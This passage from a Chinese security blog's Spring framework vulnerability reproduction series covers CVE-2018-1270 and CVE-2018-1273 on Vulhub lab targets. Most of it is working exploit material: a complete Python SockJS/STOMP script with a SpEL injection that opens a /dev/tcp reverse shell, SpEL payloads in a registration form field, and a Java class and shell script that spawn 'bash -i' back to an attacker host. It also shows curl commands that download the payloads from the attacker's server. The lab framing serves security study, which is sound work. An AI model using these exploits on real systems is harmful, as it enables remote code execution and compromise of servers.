发送一个包含 name 的 json，即可触发这个事件。当然在实战中就不同了，所以这个 poc 并不具有通用性。<br>根据你自己的需求修改 POC。如果是 vulhub 环境，你只需修改 1 中的 url 即可。<br>执行：</p><p>直接上 EXP, 注意使用的时候修改监听 IP 和靶机地址</p><pre><code>#!/usr/bin/env python3
import requests
import random
import string
import time
import threading
import logging
import sys
import json
 
logging.basicConfig(stream=sys.stdout, level=logging.INFO)
 
def random_str(length):
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for c in range(length))
 
 
class SockJS(threading.Thread):
    def __init__(self, url, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.base = f'{url}/{random.randint(0, 1000)}/{random_str(8)}'
        self.daemon = True
        self.session = requests.session()
        self.session.headers = {
            'Referer': url,
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'
        }
        self.t = int(time.time()*1000)
 
    def run(self):
        url = f'{self.base}/htmlfile?c=_jp.vulhub'
        response = self.session.get(url, stream=True)
        for line in response.iter_lines():
            time.sleep(0.5)
     
    def send(self, command, headers, body=''):
        data = [command.upper(), '\n']
 
        data.append('\n'.join([f'{k}:{v}' for k, v in headers.items()]))
         
        data.append('\n\n')
        data.append(body)
        data.append('\x00')
        data = json.dumps([''.join(data)])
 
        response = self.session.post(f'{self.base}/xhr_send?t={self.t}', data=data)
        if response.status_code != 204:
            logging.info(f&quot;send '{command}' data error.&quot;)
        else:
            logging.info(f&quot;send '{command}' data success.&quot;)
 
    def __del__(self):
        self.session.close()
 
 
sockjs = SockJS('http://你的靶机IP:8080/gs-guide-websocket')
sockjs.start()
time.sleep(1)
 
sockjs.send('connect', {
    'accept-version': '1.1,1.0',
    'heart-beat': '10000,10000'
})
sockjs.send('subscribe', {
    'selector': 'T(java.lang.Runtime).getRuntime().exec(new String[]{&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/你的kaliIP/kali监听端口;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;})',
    'id': 'sub-0',
    'destination': '/topic/greetings'
})
 
data = json.dumps({'name': 'vulhub'})
sockjs.send('send', {
    'content-length': len(data),
    'destination': '/app/hello'
}, data)
</code></pre><p>此时我们运行脚本，shell 反弹成功<br><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/27.jpg" alt="spring"></p><h2 id="spring-data-commons-远程命令执行漏洞cve-2018-1273"><a class="anchor" href="#spring-data-commons-远程命令执行漏洞cve-2018-1273">#</a> Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</h2><h3 id="漏洞描述-5"><a class="anchor" href="#漏洞描述-5">#</a> 漏洞描述：</h3><p>Spring Data 是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons 有一个重要概念：Spring Data Repository 抽象。使用 Spring Data Repository 可以极大地减少数据访问层的代码。当用户在项目中利用了 Spring-data 的相关 web 特性对用户的输入参数进行自动匹配的时候，会将用户提交的 form 表单的 key 值作为 SpEL 表达式进行注入，攻击者可以注入恶意 SpEL 表达式以执行任意命令。</p><h3 id="影响范围-5"><a class="anchor" href="#影响范围-5">#</a> 影响范围：</h3><p>Spring Data Commons 1.13 - 1.13.10<br>Spring Data Commons 2.0 - 2.0.5</p><h3 id="复现过程-5"><a class="anchor" href="#复现过程-5">#</a> 复现过程：</h3><p>注：本次漏洞复现集合全部采用 Vulhub 环境</p><p>执行如下命令启动漏洞环境：</p><pre><code>docker-compose up -d
</code></pre><p>启动完成后，访问 http://your-ip:8080 / 即可看到 web 页面。</p><p><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/29.jpg" alt="spring"></p><p>注册一个用户进行抓包，username 处构造 payload</p><pre><code>POST /users?page=&amp;size=5 HTTP/1.1
Host: localhost:8080
Connection: keep-alive
Content-Length: 124
Pragma: no-cache
Cache-Control: no-cache
Origin: http://localhost:8080
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://localhost:8080/users?page=0&amp;size=5
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8

username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;touch /tmp/success&quot;)]=&amp;password=123456&amp;repeatedPassword=123456
</code></pre><p>使用 docker-compose exec -it spring bash 可以进入到容器中，可以看到 /tmp 目录下已经创建出了名为 success 的文件</p><p>反弹 shell 的方法（针对 java 环境）：</p><p>首先上传一个编译后的 class 文件：<br>Exploit.java 文件如下：</p><pre><code>javascript
// 注意修改目标IP
//javac Exploit.java
public class Exploit{
    public Exploit(){
        try{
            Runtime.getRuntime().exec(&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/目标IP/2222 0&gt;&amp;1&quot;);
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        Exploit e = new Exploit();
    }
}
</code></pre><p>反编译一下 java 文件<br><code>javac Exploit.java</code></p><p>将反编译后的文件放在攻击主机的 /root 目录下（目录可以自定义），然后在此目录下开启一个 http 服务，用于访问下载文件：<br>// 端口可以自行修改<br><code>python -m http.server 9999</code></p><p>修改 bp 包中的内容，执行访问下载命令：</p><pre><code>username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;curl  http://192.168.0.105:9999/Exploit.class&quot;)]=&amp;password=&amp;repeatedPassword=
</code></pre><p>执行下载的文件</p><pre><code>username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;java Exploit&quot;)]=&amp;password=&amp;repeatedPassword=
</code></pre><p>shell 成功反弹<br><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/29.jpg" alt="spring"></p><p>反弹 shell 的方法（针对 bash 环境）：<br>与上面的思路大同小异，<span class="exturl" data-url="aHR0cDovL3huLS1zaXFzcnY2ajU2cmt2ZDAyYWkwNWZwejNhOWdvdXNlLnNo">只是这里执行的文件为.sh</span></p><p>sh 文件中的内容</p><pre><code>// 注意修改IP和端口
bash -i &gt;&amp; /dev/tcp/目标IP/2222 0&gt;&amp;1
</code></pre><pre><code>下载文件
username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;curl -o /tmp/bash.sh http://目标IP:9999/bash.sh&quot;)]=&amp;password=&amp;repeatedPassword=
</code></pre><div class="tags"><a href="/tags/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag"><i class="ic i-tag"></i> CVE漏洞复现</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2021-02-07 00:28:59" itemprop="dateModified" datetime="2021-02-07T00:28:59+08:00">2021-02-07</time> </span><span id="CVE漏洞复现/spring框架漏洞复现集合/" class="item leancloud_visitors" data-flag-title="spring框架漏洞复现集合" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div class="reward"><button><i class="ic i-heartbeat"></i> 赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img data-src="/images/wechatpay.png" alt="Avenue-le 微信支付"><p>微信支付</p></div><div><img data-src="/images/alipay.png" alt="Avenue-le 支付宝"><p>支付宝</p></div><div><img data-src="/images/beauty.png" alt="Avenue-le beauty"><p>beauty</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>Avenue-le <i class="ic i-at"><em>@</em></i>凌晨的信息安全之路</li><li class="link"><strong>本文链接：</strong> <a href="http://avenue.cool/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%7Fspring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/" title="spring框架漏洞复现集合">http://avenue.cool/CVE漏洞复现/spring框架漏洞复现集合/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/Python/Pyhton%E4%B8%AD%E5%8F%98%E9%87%8F%E5%90%8D%E3%80%81%E8%BE%93%E5%85%A5%E3%80%81%E8%BE%93%E5%87%BA/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipetfk5zwj20zk0m8e81.jpg" title="1.Pyhton中变量名、输入、输出"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> Python语言学习</span><h3>1.Pyhton中变量名、输入、输出</h3></a></div><div class="item right"><a href="/Python/Python%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E3%80%81%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3%E3%80%81%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%E3%80%81%E8%BF%90%E7%AE%97%E7%AC%A6/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giph4baakhj20zk0m8h5q.jpg" title="3.Python进制转换、数据类型详解、类型转换、运算符"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> Python语言学习</span><h3>3.Python进制转换、数据类型详解、类型转换、运算符</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#框架简介"><span class="toc-number">1.</span> <span class="toc-text">框架简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#spring体系结构"><span class="toc-number">2.</span> <span class="toc-text">spring 体系结构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#core核心容器"><span class="toc-number">2.1.</span> <span class="toc-text">core 核心容器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#aop-面向切面编程"><span class="toc-number">2.2.</span> <span class="toc-text">aop 面向切面编程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#数据访问data-access"><span class="toc-number">2.3.</span> <span class="toc-text">数据访问 (data access)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web层"><span class="toc-number">2.4.</span> <span class="toc-text">web 层</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#test测试"><span class="toc-number">2.5.</span> <span class="toc-text">test（测试）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#消息传输messaging"><span class="toc-number">2.6.</span> <span class="toc-text">消息传输（Messaging）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#框架特征"><span class="toc-number">3.</span> <span class="toc-text">框架特征</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#springboot之actuator配置不当的漏洞利用"><span class="toc-number">4.</span> <span class="toc-text">Springboot 之 actuator 配置不当的漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#actuator-简介"><span class="toc-number">4.1.</span> <span class="toc-text">Actuator 简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#对应路径泄露信息造成的危害"><span class="toc-number">4.2.</span> <span class="toc-text">对应路径泄露信息造成的危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#产生原因"><span class="toc-number">4.3.</span> <span class="toc-text">产生原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#trace-路径下除了记录有基本的-http-请求信息时间戳-http-头等还有用户-token-cookie-字段"><span class="toc-number">4.4.</span> <span class="toc-text">.&#x2F;trace 路径下，除了记录有基本的 HTTP 请求信息（时间戳、HTTP 头等），还有用户 token、cookie 字段：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#autoconfig路径下记录哪些自动配置条件通过了哪些没通过"><span class="toc-number">4.5.</span> <span class="toc-text">.&#x2F;autoconfig 路径下，记录哪些自动配置条件通过了，哪些没通过。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#env路径下这里一般会存放一些环境配置信息如java版本数据账号密码开放端口启动方式等信息"><span class="toc-number">4.6.</span> <span class="toc-text">.&#x2F;env 路径下，这里一般会存放一些环境配置信息如 java 版本，数据账号密码，开放端口，启动方式等信息。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#configprops路径下用来获取应用中配置的属性信息"><span class="toc-number">4.7.</span> <span class="toc-text">.&#x2F;configprops 路径下，用来获取应用中配置的属性信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#heapdump-路径下访问heapdump-路径返回-gzip-压缩-hprof-堆转储文件-在-android-studio-打开会泄露站点内存信息很多时候会包含后台用户的账号密码这个就不放图了"><span class="toc-number">4.8.</span> <span class="toc-text">.&#x2F;heapdump 路径下，访问 &#x2F;heapdump 路径，返回 GZip 压缩 hprof 堆转储文件。在 Android studio 打开，会泄露站点内存信息，很多时候会包含后台用户的账号密码。这个就不放图了</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#spring-security-oauth2-远程命令执行漏洞cve-2016-4977"><span class="toc-number">5.</span> <span class="toc-text">Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞描述"><span class="toc-number">5.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#影响范围"><span class="toc-number">5.2.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#复现过程"><span class="toc-number">5.3.</span> <span class="toc-text">复现过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#spring-webflow-远程代码执行漏洞cve-2017-4971"><span class="toc-number">6.</span> <span class="toc-text">Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞描述-2"><span class="toc-number">6.1.</span> <span class="toc-text">漏洞描述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#影响范围-2"><span class="toc-number">6.2.</span> <span class="toc-text">影响范围：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#复现过程-2"><span class="toc-number">6.3.</span> <span class="toc-text">复现过程：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#spring-data-rest-远程命令执行漏洞cve-2017-8046"><span class="toc-number">7.</span> <span class="toc-text">Spring Data Rest 远程命令执行漏洞（CVE-2017-8046）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞描述-3"><span class="toc-number">7.1.</span> <span class="toc-text">漏洞描述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#影响范围-3"><span class="toc-number">7.2.</span> <span class="toc-text">影响范围：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#复现过程-3"><span class="toc-number">7.3.</span> <span class="toc-text">复现过程：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#spring-messaging-远程命令执行漏洞cve-2018-1270"><span class="toc-number">8.</span> <span class="toc-text">Spring Messaging 远程命令执行漏洞（CVE-2018-1270）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞描述-4"><span class="toc-number">8.1.</span> <span class="toc-text">漏洞描述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#影响范围-4"><span class="toc-number">8.2.</span> <span class="toc-text">影响范围：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#复现过程-4"><span class="toc-number">8.3.</span> <span class="toc-text">复现过程：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#spring-data-commons-远程命令执行漏洞cve-2018-1273"><span class="toc-number">9.</span> <span class="toc-text">Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞描述-5"><span class="toc-number">9.1.</span> <span class="toc-text">漏洞描述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#影响范围-5"><span class="toc-number">9.2.</span> <span class="toc-text">影响范围：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#复现过程-5"><span class="toc-number">9.3.</span> <span class="toc-text">复现过程：</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2021-3156)/" rel="bookmark" title="Linux sudo权限提升漏洞复现（CVE-2021-3156)">Linux sudo权限提升漏洞复现（CVE-2021-3156)</a></li><li><a href="/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/apache-Flink_CVE-2020-17518/" rel="bookmark" title="Apache-Flink_CVE-2020-17518">Apache-Flink_CVE-2020-17518</a></li><li class="active"><a href="/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%7Fspring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/" rel="bookmark" title="spring框架漏洞复现集合">spring框架漏洞复现集合</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="Avenue-le" data-src="/images/avatar.jpg"><p class="name" itemprop="name">Avenue-le</p><div class="description" itemprop="description">凌晨的信息安全之路 & 随学</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">23</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">8</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">7</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL0F2ZW51ZS1sZQ==" title="https:&#x2F;&#x2F;github.com&#x2F;Avenue-le"><i class="ic i-github"></i></span> <span class="exturl item twitter" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS95b3VybmFtZQ==" title="https:&#x2F;&#x2F;twitter.com&#x2F;yourname"><i class="ic i-twitter"></i></span> <span class="exturl item zhihu" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3Blb3BsZS95b3VybmFtZQ==" title="https:&#x2F;&#x2F;www.zhihu.com&#x2F;people&#x2F;yourname"><i class="ic i-zhihu"></i></span> <span class="exturl item music" data-url="aHR0cHM6Ly9tdXNpYy4xNjMuY29tLyMvdXNlci9ob21lP2lkPTMzMjI4ODk5MTY=" title="https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;3322889916"><i class="ic i-cloud-music"></i></span> <span class="exturl item weibo" data-url="aHR0cHM6Ly93ZWliby5jb20veW91cm5hbWU=" title="https:&#x2F;&#x2F;weibo.com&#x2F;yourname"><i class="ic i-weibo"></i></span> <span class="exturl item about" data-url="aHR0cHM6Ly9hYm91dC5tZS95b3VybmFtZQ==" title="https:&#x2F;&#x2F;about.me&#x2F;yourname"><i class="ic i-address-card"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>友達</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/Python/Pyhton%E4%B8%AD%E5%8F%98%E9%87%8F%E5%90%8D%E3%80%81%E8%BE%93%E5%85%A5%E3%80%81%E8%BE%93%E5%87%BA/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/Python/Python%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E3%80%81%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3%E3%80%81%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%E3%80%81%E8%BF%90%E7%AE%97%E7%AC%A6/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/Increase-authority/" title="分类于 提权知识">提权知识</a></div><span><a href="/Increase-authority/Linux%20tee%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83/" title="Linux tee命令提权">Linux tee命令提权</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Increase-authority/" title="分类于 提权知识">提权知识</a></div><span><a href="/Increase-authority/Linux%E6%8F%90%E6%9D%83%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/" title="Linux提权相关命令">Linux提权相关命令</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="分类于 CVE漏洞复现">CVE漏洞复现</a></div><span><a href="/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2021-3156)/" title="Linux sudo权限提升漏洞复现（CVE-2021-3156)">Linux sudo权限提升漏洞复现（CVE-2021-3156)</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Increase-authority/" title="分类于 提权知识">提权知识</a></div><span><a href="/Increase-authority/linux%20SUID%20%E6%8F%90%E6%9D%83/" title="linux SUID 提权">linux SUID 提权</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Python/" title="分类于 Python语言学习">Python语言学习</a></div><span><a href="/Python/mkardown%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/" title="mkardown 基础语法">mkardown 基础语法</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Increase-authority/" title="分类于 提权知识">提权知识</a></div><span><a href="/Increase-authority/linux%20%20git%20%E6%8F%90%E6%9D%83/" title="linux  git 提权">linux git 提权</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/WEB/" title="分类于 WEB安全知识">WEB安全知识</a> <i class="ic i-angle-right"></i> <a href="/categories/WEB/Web-Foundation/" title="分类于 WEB基础知识">WEB基础知识</a></div><span><a href="/WEB/Web-Foundation/Web%E7%AE%80%E4%BB%8B/" title="1. WEB简介">1. WEB简介</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Python/" title="分类于 Python语言学习">Python语言学习</a></div><span><a href="/Python/Python%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E3%80%81%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3%E3%80%81%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%E3%80%81%E8%BF%90%E7%AE%97%E7%AC%A6/" title="3.Python进制转换、数据类型详解、类型转换、运算符">3.Python进制转换、数据类型详解、类型转换、运算符</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="分类于 CVE漏洞复现">CVE漏洞复现</a></div><span><a href="/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%7Fspring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/" title="spring框架漏洞复现集合">spring框架漏洞复现集合</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/WEB/" title="分类于 WEB安全知识">WEB安全知识</a> <i class="ic i-angle-right"></i> <a href="/categories/WEB/Information-Gathering/" title="分类于 信息收集">信息收集</a></div><span><a href="/WEB/Information-Gathering/1.%20%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="1. 为什么要进行信息收集">1. 为什么要进行信息收集</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2021</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">Avenue-le @ Avenue-le</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">41k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">37 分钟</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"CVE漏洞复现/spring框架漏洞复现集合/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->